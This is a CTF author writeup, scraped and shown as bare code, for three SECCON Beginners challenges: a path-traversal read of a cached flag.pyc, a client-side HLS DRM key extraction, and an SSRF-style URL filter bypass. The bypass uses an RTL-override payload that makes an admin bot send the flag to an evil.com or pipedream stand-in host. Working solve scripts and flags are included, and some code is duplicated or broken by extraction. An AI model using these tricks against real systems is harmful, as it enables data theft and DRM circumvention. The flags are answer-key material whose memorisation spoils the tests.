# SECCON Beginners CTF (ctf4b) 作問者writeup

> 原文: https://www.ctfiot.com/117903.html
> ID: 117903


```
import os
import sys
import shutil
import hashlib
from flag import flag

def initialization():
 if os.path.exists("./flags"):
 shutil.rmtree("./flags")
 os.mkdir("./flags")

 def write_hash(hash, bit):
 with open(f"./flags/sha{bit}.txt", "w") as f:
 f.write(hash)

 sha256 = hashlib.sha256(flag).hexdigest()
 write_hash(sha256, "256")

 sha384 = hashlib.sha384(flag).hexdigest()
 write_hash(sha384, "384")

 sha512 = hashlib.sha512(flag).hexdigest()
 write_hash(sha512, "512")

def get_full_path(file_path: str):
 full_path = os.path.join(os.getcwd(), file_path)
 return os.path.normpath(full_path)

def check1(file_path: str):
 program_root = os.getcwd()
 dirty_path = get_full_path(file_path)
 return dirty_path.startswith(program_root)

def check2(file_path: str):
 if os.path.basename(file_path) == "flag.py":
 return False
 return True

if __name__ == "__main__":
 initialization()
 print(sys.version)
 file_path = input("Input your salt file name(default=./flags/sha256.txt):")
 if file_path == "":
 file_path = "./flags/sha256.txt"
 if not check1(file_path) or not check2(file_path):
 print("No Hack!!! Your file path is not allowed.")
 exit()
 try:
 with open(file_path, "rb") as f:
 hash = f.read()
 print(f"{hash=}")
 
except:
 print("No Hack!!!")
def get_full_path(file_path: str):
 full_path = os.path.join(os.getcwd(), file_path)
 return os.path.normpath(full_path)

def check1(file_path: str):
 program_root = os.getcwd()
 dirty_path = get_full_path(file_path)
 return dirty_path.startswith(program_root)

def check2(file_path: str):
 if os.path.basename(file_path) == "flag.py":
 return False
 return True
\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00
$ nc shaxxx.beginners.seccon.games 25612
3.11.3 (main, May 10 2023, 12:26:31) [GCC 12.2.1 20220924]
Input your salt file name(default=./flags/sha256.txt):
__pycache__/flag.cpython-311.pyc
hash=b'\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00'
const keyUrl = "/enc.key";
class CustomLoader extends Hls.DefaultConfig.loader {
 constructor(config) {
 super(config);
 this.context = { url: keyUrl };
 const load = this.load.bind(this);
 this.load = function (context, config, callbacks) {
 if (context.type === "manifest") {
 const onSuccess = callbacks.onSuccess;
 callbacks.onSuccess = function (response, stats, context) {
 response.data = response.data.replace(
 /#EXT-X-KEY:
METHOD=.*,URI=".*"/,
 `#EXT-X-KEY:
METHOD=AES-128,URI="${keyUrl}"`
 );
 onSuccess(response, stats, context);
 };
 } else {
 if (context.url.endsWith(keyUrl)) {
 window.gContext = context
 hlscotext.load(context);
 context = window.gContext;
 }
 window.globalContext = null;
 }
 return load(context, config, callbacks);
 };
 }
}

function mediaPlayer() {
 const video = document.getElementById("video");
 if (!video) {
 return;
 }
 if (typeof Hls !== "undefined" && Hls.isSupported()) {
 const hls = new Hls({ loader: CustomLoader });
 const streamUrl = "/public/videos/video.m3u8";
 hls.loadSource(streamUrl);
 hls.on(Hls.Events.MANIFEST_PARSED, () => {
 hls.attachMedia(video);
 video.addEventListener("canplay", () => {
 console.info("The video can play!");
 });
 });
 } else {
 alert("sorry, your browser does not support.");
 }
}

const initWasm = async () => {
 console.log("wasm loading: start!");
 try {
 const go = new Go();
 const response = await fetch("/main.wasm");
 const buffer = await response.arrayBuffer();
 const result = await WebAssembly.instantiate(buffer, go.importObject);
 go.run(result.instance);
 console.log("wasm loading: finished!");
 } catch (e) {
 alert("sorry, your browser does not support wasm.");
 }
};
initWasm().then(() => {
 mediaPlayer();
});
if (context.url.endsWith(keyUrl)) {
 window.gContext = context
 hlscotext.load(context);
 context = window.gContext;
}
key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
wget https://drmsaw.beginners.seccon.games/public/videos/video0.ts
wget https://drmsaw.beginners.seccon.games/public/videos/video1.ts
wget https://drmsaw.beginners.seccon.games/public/videos/video2.ts
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:
METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
#EXTINF:3.040000,
file:///app/video0.ts
#EXTINF:3.040000,
file:///app/video1.ts
#EXTINF:2.280000,
file:///app/video2.ts
#EXT-X-ENDLIST
def make_key():
 key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
 with open("enc.key", "wb") as f:
 f.write(bytes(key))
ffmpeg -allowed_extensions ALL -i ./video.m3u8 -c copy video.mp4 -y
import subprocess
import requests

APP_URL = "http://drmsaw.beginners.seccon.games"

def download():
 subprocess.run(["wget", f"{APP_URL}/public/videos/video0.ts"])
 subprocess.run(["wget", f"{APP_URL}/public/videos/video1.ts"])
 subprocess.run(["wget", f"{APP_URL}/public/videos/video2.ts"])

def make_key():
 key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
 with open("enc.key", "wb") as f:
 f.write(bytes(key))

def make_m3u8():
 m3u8 = """#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-KEY:
METHOD=AES-128,URI="file:///app/enc.key",IV=0x00000000000000000000000000000000
#EXTINF:3.040000,
file:///app/video0.ts
#EXTINF:3.040000,
file:///app/video1.ts
#EXTINF:2.280000,
file:///app/video2.ts
#EXT-X-ENDLIST
"""

 with open("video.m3u8", "w") as f:
 f.write(m3u8)

def combine():
 subprocess.run(["ffmpeg", "-allowed_extensions", "ALL", "-i", "./video.m3u8", "-c", "copy", "video.mp4", "-y"])

def upload():
 mimetype = "video/mp4"
 file = {'video': ('file', open('./video.mp4', 'rb'), mimetype)}
 res = requests.post(f"{APP_URL}/flag", files=file).text
 print(res)

if __name__ == "__main__":
 download()
 make_key()
 make_m3u8()
 combine()
 upload()
(｡˃ ᵕ ˂ ) Congratulation! ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_1n_cl13n7-51d3-4pp5}
@app.route("/", methods=["POST"])
def chall():
 try:
 text = request.json["text"]
 
except Exception:
 return {"message": "text is required."}
 fileId = uuid.uuid4()
 file_path = f"/var/www/uploads/{fileId}.html"
 with open(file_path, "w", encoding="utf-8") as f:
 f.write(f'{text}')
 message, ocr_url, input_url = share2admin(text, fileId)
 os.remove(file_path)
 return {"message": message, "ocr_url": ocr_url, "input_url": input_url}
import os
import re
import pyocr
import requests
from PIL import Image
from selenium import webdriver

APP_URL = os.getenv("APP_URL", "http://localhost:
16161/")
FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}")

# read text from image
def ocr(image_path: str):
 tool = pyocr.get_available_tools()[0]
 return tool.image_to_string(Image.open(image_path), lang="eng")

def openWebPage(fileId: str):
 try:
 chrome_options = webdriver.ChromeOptions()
 chrome_options.add_argument("--no-sandbox")
 chrome_options.add_argument("--headless")
 chrome_options.add_argument("--disable-gpu")
 chrome_options.add_argument("--disable-dev-shm-usage")
 chrome_options.add_argument("--window-size=1920,1080")
 driver = webdriver.Chrome(options=chrome_options)
 driver.implicitly_wait(10)
 url = f"file:///var/www/uploads/{fileId}.html"
 driver.get(url)

 image_path = f"./images/{fileId}.png"
 driver.save_screenshot(image_path)
 driver.quit()
 text = ocr(image_path)
 os.remove(image_path)
 return text
 
except Exception:
 return None

def find_url_in_text(text: str):
 result = re.search(r"https?://[\w/:&\?\.=]+", text)
 if result is None:
 return ""
 else:
 return result.group()

def share2admin(input_text: str, fileId: str):
 # admin opens the HTML file in a browser...
 ocr_text = openWebPage(fileId)
 if ocr_text is None:
 return "admin: Sorry, internal server error."

 # If there's a URL in the text, I'd like to open it.
 ocr_url = find_url_in_text(ocr_text)
 input_url = find_url_in_text(input_text)

 # not to open dangerous url
 if not ocr_url.startswith(APP_URL):
 return "admin: It's not url or safe url.", ocr_url, input_text

 try:
 # It seems safe url, therefore let's open the web page.
 requests.get(f"{input_url}?flag={FLAG}")
 
except Exception:
 return "admin: I could not open that inner link.", ocr_url, input_text
 return "admin: Very good web site. Thanks for sharing!", ocr_url, input_text
def find_url_in_text(text: str):
 result = re.search(r"https?://[\w/:&\?\.=]+", text)
 if result is None:
 return ""
 else:
 return result.group()
<!--http://evil.com-->https://phisher2.beginners.seccon.games/
[U+202E]http://evil.com/semag.nocces.srennigeb.2rehsihp//:
sptth
https://phisher2.beginners.seccon.games/
import requests
import json
import os
def attack():
 ENDPOINT = "https://phisher2.beginners.seccon.games"

 text = "[U+202E]https://{YOUR_PIPEDREAM_DOMAIN}.m.pipedream.net/{ENDPOINT[::-1]}"
 res = requests.post(f"{ENDPOINT}", json={"text": text}).text
 message = json.loads(res)["message"]
 if message != "admin: Very good web site. Thanks for sharing!":
 raise ValueError(f"ERROR {message}")
```
